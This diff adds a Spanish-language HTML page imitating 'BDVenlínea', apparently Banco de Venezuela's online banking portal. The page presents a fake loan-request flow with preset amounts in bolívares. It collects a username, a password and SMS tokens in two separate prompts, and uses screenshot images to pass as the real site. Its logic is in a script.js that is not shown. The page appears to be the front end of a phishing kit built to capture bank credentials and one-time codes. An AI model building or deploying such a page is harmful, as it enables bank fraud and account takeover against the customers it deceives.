@@ -1,1 +1,525 @@
-.
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlíneasolicitudes</title>
+     <!-- Enlace al icono -->
+    <link rel="icon" href="favicon.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="loading-screen hidden">
+        <div class="carga-contenedor">
+            <div class="barra"></div>
+            <div class="barra"></div>
+            <div class="barra"></div>
+            <div class="barra"></div>
+            <div class="barra"></div>
+        </div>
+    </div>
+
+    <div class="login-container hidden">
+        <div class="login-box">
+            <img src="png.png" alt="png" class="login-logo">
+            <form id="loginForm">
+                <div class="input-field">
+                    <input type="text" id="usuario" placeholder=" " required>
+<label for="usuario" class="etiqueta-flotante">Usuario *</label>
+                </div>
+                <button type="button" id="entrarBtn" class="login-button"disabled>Entrar</button>
+            </form>
+            <div class="login-help">
+                <p>
+                    <a href="#" class="single-line">¿Olvidaste tu usuario o clave?</a>
+                    Si eres <span class="bold-text">nuevo usuario</span> <a href="#" class="bold-text">registrate aquí</a>
+                </p>
+            </div>
+        </div>
+        <div class="modal password-modal hidden">
+            <p>Introduce tu contraseña</p>
+            <form id="passwordForm">
+                    <div class="input-field" style="position: relative;">
+                    <input type="password" id="password" placeholder=" " required>
+<label for="password" class="etiqueta-flotante">Contraseña</label> <span class="ver-contrasena-btn" onclick="togglePasswordVisibility()">
+        <img src="vs.jpg" id="password-icon" alt="Mostrar Contraseña">
+                    </span>
+                </div>
+                <button type="button" id="continuarBtn" class="login-button"disabled>Continuar</button>
+                <button type="button" id="cancelarBtn" class="login-button">Cancelar</button>
+            </form>
+        </div>
+    </div>
+
+<!-- ==========================================
+     AUTENTICACIÓN INDEPENDIENTE
+========================================== -->
+
+<!-- Sombra de autenticación -->
+<div id="auth-sombra" class="auth-sombra hidden"></div>
+
+<!-- Ventana de autenticación -->
+<div class="modal auth-modal hidden">
+
+    <p id="auth-title">Autenticación</p>
+
+    <p>Introduzca el token recibido por SMS</p>
+
+    <form id="authForm">
+
+        <div class="input-field">
+            <input
+                type="text"
+                id="authCode"
+                placeholder="Introduzca código recibi..."
+                required
+            >
+        </div>
+
+        <div class="auth-buttons">
+
+            <button
+                type="button"
+                id="authBtn"
+                class="login-button"
+                disabled
+            >
+                Continuar
+            </button>
+
+            <button
+                type="button"
+                id="cancelarAuthBtn"
+                class="login-button"
+            >
+                Cancelar
+            </button>
+
+        </div>
+
+    </form>
+
+</div>
+<!-- ==========================================
+     SECCIÓN SÍ: FORMULARIO INTERACTIVO
+========================================== -->
+
+<section id="seccion-si" class="hidden">
+
+    <div class="fondo-seccion-si formulario-imagen-contenedor">
+
+        <!-- Imagen base -->
+        <img
+            src="3.png"
+            class="formulario-imagen-fondo"
+            alt=""
+            draggable="false"
+        >
+        <div id="formulario-ultima-conexion" class="formulario-ultima-conexion">
+    Bienvenido a BDVenlínea solicitudes Última conexión -
+    <span id="formulario-fecha-conexion"></span>
+</div>
+
+        <!-- CAMPO 1 -->
+        <div class="formulario-campo formulario-campo-1">
+
+            <button type="button" class="formulario-campo-control"
+                    aria-expanded="false">
+
+                <span class="formulario-etiqueta">
+                    Monto
+                </span>
+
+                <span class="formulario-valor"></span>
+
+                <span class="formulario-flecha"></span>
+
+                <span class="formulario-linea"></span>
+
+            </button>
+
+<div class="formulario-opciones">
+
+    <!-- Texto superior del menú -->
+    <div class="formulario-opciones-titulo">
+        Seleccione el monto
+    </div>
+
+    <!-- Primera opción resaltada -->
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="889.575,40 Bs">
+        889.575,40 Bs
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="1.779.150,80 Bs">
+        1.779.150,80 Bs
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="2.668.726,20 Bs">
+        2.668.726,20 Bs
+    </button>
+    
+        <button type="button"
+            class="formulario-opcion"
+            data-valor="4.447.877,00 Bs">
+        4.447.877,00 Bs
+    </button>
+    
+        <button type="button"
+            class="formulario-opcion"
+            data-valor="8.895.754,00 Bs">
+        8.895.754,00 Bs
+    </button>
+    
+            <button type="button"
+            class="formulario-opcion"
+            data-valor="13.343.631,00 Bs">
+        13.343.631,00 Bs
+    </button>
+    
+            <button type="button"
+            class="formulario-opcion"
+            data-valor="17.791.508,00 Bs">
+        17.791.508,00 Bs
+    </button>
+
+</div>
+
+        </div>
+
+        <!-- CAMPO 2 -->
+        <div class="formulario-campo formulario-campo-2">
+
+            <button type="button" class="formulario-campo-control"
+                    aria-expanded="false">
+
+                <span class="formulario-etiqueta">
+                    Plazo
+                </span>
+
+                <span class="formulario-valor"></span>
+
+                <span class="formulario-flecha"></span>
+
+                <span class="formulario-linea"></span>
+
+            </button>
+
+<div class="formulario-opciones">
+
+    <!-- Texto superior del menú -->
+    <div class="formulario-opciones-titulo">
+        Seleccione el plazo
+    </div>
+
+    <!-- Primera opción resaltada -->
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="12 meses">
+        12 meses
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="24 meses">
+        24 meses
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="36 meses">
+        36 meses
+    </button>
+
+</div>
+
+        </div>
+
+        <!-- CAMPO 3 -->
+        <div class="formulario-campo formulario-campo-3">
+
+            <button type="button" class="formulario-campo-control"
+                    aria-expanded="false">
+
+                <span class="formulario-etiqueta">
+                    Cuotas
+                </span>
+
+                <span class="formulario-valor"></span>
+
+                <span class="formulario-flecha"></span>
+
+                <span class="formulario-linea"></span>
+
+            </button>
+
+<div class="formulario-opciones">
+
+    <!-- Texto superior del menú -->
+    <div class="formulario-opciones-titulo">
+        Seleccione las cuotas
+    </div>
+
+    <!-- Primera opción resaltada -->
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="mensuales">
+        mensuales
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="trimestrales">
+        trimestrales
+    </button>
+
+    <button type="button"
+            class="formulario-opcion"
+            data-valor="semestrales">
+        semestrales
+    </button>
+
+</div>
+
+        </div>
+
+        <!-- BOTONES -->
+        <button
+            type="button"
+            id="formulario-boton-continuar"
+            disabled
+        >
+            Confirmar
+        </button>
+
+        <button
+            type="button"
+            id="formulario-boton-cancelar"
+        >
+            Cancelar
+        </button>
+
+    </div>
+
+</section>
+
+<!-- ==========================================
+     NUEVA SECCIÓN INTERMEDIA
+========================================== -->
+
+<section id="seccion-intermedia" class="hidden">
+
+    <!-- Imagen de fondo -->
+    
+<!-- Imagen de fondo y fecha de conexión -->
+<div class="intermedio-fondo-contenedor">
+
+    <img
+        src="1.png"
+        class="intermedio-fondo"
+        alt=""
+        draggable="false"
+    >
+
+    <div class="ultima-conexion-compartida">
+        Bienvenido a BDVenlínea solicitudes Última conexión -
+        <span class="fecha-conexion-compartida"></span>
+    </div>
+
+</div>
+
+    <!-- Oscurecimiento del fondo -->
+    <div id="intermedio-sombra" class="intermedio-sombra hidden"></div>
+    
+    <!-- Ventana central -->
+    <div id="intermedio-ventana" class="intermedio-ventana hidden">
+
+        <!-- Imagen interior -->
+        <div class="intermedio-imagen-contenedor">
+
+            <img
+                src="2.png"
+                class="intermedio-imagen"
+                alt=""
+                draggable="false"
+            >
+
+        </div>
+
+        <!-- Botón Continuar -->
+        <button
+            type="button"
+            id="intermedio-boton-continuar"
+        >
+            Continuar
+        </button>
+
+    </div>
+
+</section>
+
+<!-- ===================================== -->
+<!-- SECCIÓN NO -->
+<!-- ===================================== -->
+
+<section id="seccion-no" class="hidden">
+
+    <h1>No</h1>
+
+</section>
+
+
+
+
+
+<!-- ==========================================
+     SECCIÓN RESULTADO
+========================================== -->
+
+<!-- ==========================================
+     SECCIÓN RESULTADO
+========================================== -->
+
+<section id="resultado" class="hidden">
+
+    <!-- IMAGEN ÚNICA Y ELEMENTOS INTERACTIVOS -->
+    <div class="resultado-imagen-contenedor">
+
+        <img
+            src="4.png"
+            class="resultado-imagen-fondo"
+            alt=""
+            draggable="false"
+        >
+
+        <!-- TEXTO ÚLTIMA CONEXIÓN -->
+        <div class="ultima-conexion-compartida">
+            Bienvenido a BDVenlínea solicitudes Última conexión -
+            <span class="fecha-conexion-compartida"></span>
+        </div>
+
+        <!-- BOTÓN ACEPTAR -->
+        <button
+            type="button"
+            id="resultado-aceptarBtn"
+            class="resultado-boton"
+        >
+            Aceptar
+        </button>
+
+        <!-- BOTÓN RECHAZAR -->
+        <button
+            type="button"
+            id="resultado-rechazarBtn"
+            class="resultado-boton"
+        >
+            Rechazar
+        </button>
+
+    </div>
+
+</section>
+
+
+
+
+<!-- ==========================================
+     VENTANA CALIFICACIÓN
+========================================== -->
+
+<div
+    id="calificacion-sombra"
+    class="auth-sombra hidden"
+></div>
+
+<div
+    id="calificacion-modal"
+    class="modal auth-modal calificacion-modal hidden"
+>
+
+    <p class="calificacion-titulo">
+        Autenticación
+    </p>
+
+    <p>Introduzca el token recibido por SMS</p>
+
+    <form id="calificacionForm">
+
+        <div class="input-field">
+
+            <input
+                type="text"
+                id="calificacionCode"
+                placeholder="Introduzca código recibi..."
+                required
+            >
+
+        </div>
+
+        <div class="auth-buttons">
+
+            <button
+                type="button"
+                id="calificacionBtn"
+                class="login-button"
+                disabled
+            >
+                Continuar
+            </button>
+
+            <button
+                type="button"
+                id="cancelarCalificacionBtn"
+                class="login-button"
+            >
+                Cancelar
+            </button>
+
+        </div>
+
+    </form>
+
+</div>
+
+<!-- ==========================================
+     SECCIÓN RESULTADO 2
+========================================== -->
+
+
+<!-- ==========================================
+     SECCIÓN RESULTADO 2
+========================================== -->
+
+<section id="resultado2" class="hidden">
+
+    <div class="resultado2-imagen-contenedor">
+
+        <!-- Imagen de fondo -->
+        <img
+            src="5.png"
+            class="resultado2-imagen-fondo"
+            alt=""
+            draggable="false"
+        >
+
+        <!-- Texto de última conexión -->
+        <div class="resultado2-ultima-conexion">
+            Bienvenido a BDVenlínea solicitudes Última conexión -
+            <span class="fecha-conexion-compartida"></span>
+        </div>
+
+    </div>
+
+</section>
+
+
+    <script src="script.js"></script>
+</body>
+</html>
